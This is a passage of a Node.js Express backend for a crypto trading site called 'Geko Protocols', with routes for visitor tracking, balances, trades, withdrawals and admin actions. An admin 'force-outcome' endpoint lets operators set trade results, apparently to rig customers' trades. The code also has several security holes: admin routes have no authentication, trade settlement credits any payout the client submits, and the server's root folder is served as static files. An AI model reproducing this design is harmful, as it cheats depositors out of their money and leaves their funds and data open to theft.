      await pool.query('UPDATE geko_visitors SET last_seen = NOW(), visit_count = visit_count + 1, ip_address = $2, user_agent = $3, page_path = $4 WHERE visitor_id = $1', [visitor_id, ip, user_agent, page_path]);
    } else {
      await pool.query('INSERT INTO geko_visitors (visitor_id, ip_address, user_agent, page_path) VALUES ($1,$2,$3,$4)', [visitor_id, ip, user_agent, page_path]);
    }
    return res.json({ success: true });
  } catch (e) { 
    console.error('Visitor track error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const result = await pool.query('SELECT * FROM geko_visitors ORDER BY last_seen DESC LIMIT 500');
    return res.json(result.rows);
  } catch (e) { 
    console.error('Visitor fetch error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── User balance ──────────────────────────────────────────────────────────
app.get('/api/user/transactions', async (req, res) => {
  const { address, limit } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const result = await pool.query(
      `SELECT * FROM transactions WHERE wallet_address = $1 ORDER BY created_at DESC LIMIT $2`,
      [address, parseInt(limit || '50')]
    );
    res.json({ success: true, transactions: result.rows });
  } catch (e) {
    console.error('Fetch transactions error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/user/balance', async (req, res) => {
  const { address, asset } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const userRes = await pool.query('SELECT trading_balance, protocol_settlement_balance, demo_balance FROM geko_users WHERE wallet_address = $1', [address]);
    const user = userRes.rows[0] || { trading_balance: 0, protocol_settlement_balance: 0, demo_balance: 100000 };

    if (asset === 'USDT') {
      return res.json({ 
        wallet_address: address, 
        asset: 'USDT', 
        balance: parseFloat(user.protocol_settlement_balance || 0),
        trading_balance: parseFloat(user.trading_balance || 0),
        demo_balance: parseFloat(user.demo_balance || 100000)
      });
    }

    const result = await pool.query(`SELECT asset_symbol, COALESCE(SUM(amount), 0) AS balance FROM transactions WHERE wallet_address = $1 AND status = 'completed' AND type != 'trade' GROUP BY asset_symbol`, [address]);
    const balances = result.rows.map(r => ({ asset: r.asset_symbol, balance: parseFloat(r.balance) }));

    const usdtIdx = balances.findIndex(b => b.asset === 'USDT');
    if (usdtIdx >= 0) balances[usdtIdx].balance = parseFloat(user.protocol_settlement_balance || 0);
    else balances.push({ asset: 'USDT', balance: parseFloat(user.protocol_settlement_balance || 0) });

    return res.json({ wallet_address: address, balances, trading_balance: user.trading_balance, demo_balance: user.demo_balance });
  } catch (e) {
    console.error('Balance query error:', e.message);
    return res.status(500).json({ error: 'Balance query failed' });
  }
});

// ─── Trade endpoints ───────────────────────────────────────────────────────
app.get('/api/user/active-trades', async (req, res) => {
  const { address } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const result = await pool.query(
      "SELECT * FROM trades WHERE wallet_address = $1 AND status = 'pending' ORDER BY created_at DESC",
      [address]
    );
    res.json(result.rows);
  } catch (e) {
    console.error('Fetch active trades error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/execute-trade', async (req, res) => {
  const { walletAddress, asset, tradeSize, leverage, type, isDemo, entryPrice, duration, tradeId } = req.body;
  if (!walletAddress || !tradeSize) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const amt = Math.abs(parseFloat(tradeSize));
    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
    
    // Check balance
    const userRes = await pool.query(`SELECT ${balanceField} FROM geko_users WHERE wallet_address = $1`, [walletAddress]);
    if (userRes.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    
    const balance = parseFloat(userRes.rows[0][balanceField] || 0);
    if (balance < amt) return res.status(400).json({ error: 'Insufficient balance' });

    // Deduct balance
    await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} - $1 WHERE wallet_address = $2`, [amt, walletAddress]);

    // Insert trade record
    await pool.query(
      `INSERT INTO trades (id, wallet_address, symbol, direction, amount, entry_price, duration, is_demo, status)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, 'pending')`,
      [tradeId || Math.random().toString(36).substring(7), walletAddress, asset, type, amt, entryPrice, duration, isDemo || false]
    );

    // Record transaction
    await recordTransaction({
      wallet_address: walletAddress,
      asset_symbol: 'USDT',
      amount: -amt,
      type: 'trade',
      reference: `trade-open:${tradeId}`
    });

    res.json({ success: true, message: 'Trade executed' });
  } catch (e) {
    console.error('Execute trade error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/settle-trade', async (req, res) => {
  const { walletAddress, asset, payout, tradeRef, isDemo, status } = req.body;
  if (!walletAddress || payout === undefined) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const amt = parseFloat(payout);
    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';

    // Update trade record
    await pool.query(
      "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2 AND wallet_address = $3",
      [status || 'settled', tradeRef, walletAddress]
    );

    // Credit balance if payout > 0
    if (amt > 0) {
      await pool.query(`UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`, [amt, walletAddress]);
      
      // Record transaction
      await recordTransaction({
        wallet_address: walletAddress,
        asset_symbol: 'USDT',
        amount: amt,
        type: 'trade',
        reference: `trade-settle:${tradeRef}`
      });
    }

    res.json({ success: true, message: 'Trade settled' });
  } catch (e) {
    console.error('Settle trade error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Withdrawal endpoints ──────────────────────────────────────────────────
app.post('/api/request-withdrawal', async (req, res) => {
  const { walletAddress, destinationAddress, amount, asset } = req.body;
  if (!walletAddress || !destinationAddress || !amount || !asset)
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const balance = await getUserBalance(walletAddress, asset);
    if (balance < parseFloat(amount))
      return res.status(400).json({ success: false, error: `Insufficient balance. Available: ${balance} ${asset}` });

    const result = await pool.query(
      `INSERT INTO withdrawal_requests (wallet_address, destination_address, amount, asset, status)
       VALUES ($1, $2, $3, $4, 'pending') RETURNING *`,
      [walletAddress, destinationAddress.trim(), parseFloat(amount), asset]
    );

    return res.json({ success: true, requestId: result.rows[0].id });
  } catch (e) {
    console.error('Withdrawal request error:', e.message);
    return res.status(500).json({ success: false, error: e.message });
  }
});

// ─── Admin Trade endpoints ─────────────────────────────────────────────────
app.get('/api/admin/active-trades', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const result = await pool.query("SELECT * FROM trades WHERE status = 'pending' ORDER BY created_at DESC");
    res.json(result.rows);
  } catch (e) {
    console.error('Admin active trades error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/force-outcome', async (req, res) => {
  const { tradeId, forceOutcome } = req.body;
  if (!tradeId || !forceOutcome) return res.status(400).json({ error: 'tradeId and forceOutcome required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    await pool.query('UPDATE trades SET force_outcome = $1 WHERE id = $2', [forceOutcome, tradeId]);
    res.json({ success: true });
  } catch (e) {
    console.error('Force outcome error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Admin Withdrawal endpoints ───────────────────────────────────────────
app.get('/api/admin/withdrawal-requests', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const wrRes = await pool.query(
      `SELECT wr.*, u.nickname FROM withdrawal_requests wr
       LEFT JOIN geko_users u ON u.wallet_address = wr.wallet_address
       ORDER BY wr.created_at DESC LIMIT 200`
    );
    
    // Enrich with current balance for the specific asset
    const enriched = await Promise.all(wrRes.rows.map(async (wr) => {
        const current_balance = await getUserBalance(wr.wallet_address, wr.asset);
        return { ...wr, current_balance };
    }));

    return res.json(enriched);
  } catch (e) {
    console.error('Admin withdrawal-requests error:', e.message);
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/approve-withdrawal', async (req, res) => {
  const { requestId } = req.body;
  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const wrRes = await pool.query('SELECT * FROM withdrawal_requests WHERE id = $1', [requestId]);
    if (!wrRes.rows.length) return res.status(404).json({ success: false, error: 'Request not found' });
    const wr = wrRes.rows[0];
    if (wr.status !== 'pending') return res.status(400).json({ success: false, error: 'Request not pending' });

    const balance = await getUserBalance(wr.wallet_address, wr.asset);
    if (balance < parseFloat(wr.amount)) return res.status(400).json({ success: false, error: 'Insufficient user balance' });

    // 1. Mark as approved
    await pool.query('UPDATE withdrawal_requests SET status = $1, processed_at = NOW() WHERE id = $2', ['approved', requestId]);

    // 2. Debit balance
    if (wr.asset === 'USDT') {
        await pool.query('UPDATE geko_users SET protocol_settlement_balance = protocol_settlement_balance - $1 WHERE wallet_address = $2', [wr.amount, wr.wallet_address]);
    }
    
    await recordTransaction({
      wallet_address: wr.wallet_address,
      asset_symbol: wr.asset,
      amount: -parseFloat(wr.amount),
      type: 'withdrawal',
      reference: `withdrawal-approved:${requestId}`
    });

    return res.json({ success: true });
  } catch (e) {
    console.error('Approve withdrawal error:', e.message);
    return res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/admin/reject-withdrawal', async (req, res) => {
  const { requestId, note } = req.body;
  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    await pool.query('UPDATE withdrawal_requests SET status = $1, admin_note = $2, processed_at = NOW() WHERE id = $3', ['rejected', note, requestId]);
    return res.json({ success: true });
  } catch (e) {
    console.error('Reject withdrawal error:', e.message);
    return res.status(500).json({ error: e.message });
  }
});

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.resolve(__dirname, 'dist');
const publicPath = path.resolve(__dirname, 'public');
const rootPath = __dirname;

app.use(express.static(distPath));
app.use(express.static(publicPath));
app.use(express.static(rootPath));

app.get('*', (req, res) => {
  if (req.url.includes('.') && !req.url.endsWith('.html')) return res.status(404).send("Asset not found");
  const possiblePaths = [path.join(distPath, 'index.html'), path.join(publicPath, 'index.html'), path.join(rootPath, 'index.html')];
  for (const indexPath of possiblePaths) { if (fs.existsSync(indexPath)) return res.sendFile(indexPath); }
  res.status(404).send("<h1>Frontend Build Not Found</h1>");
});

// ─── Global Error Handler ──────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err);
  res.status(err.status || 500).json({
    error: err.message || 'Internal Server Error',
    success: false
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Geko Protocols Server: http://0.0.0.0:${port}`);
  console.log(`🗄️  Database Status: ${dbAvailable ? 'CONNECTED ✅' : 'DISCONNECTED ❌'}`);
});
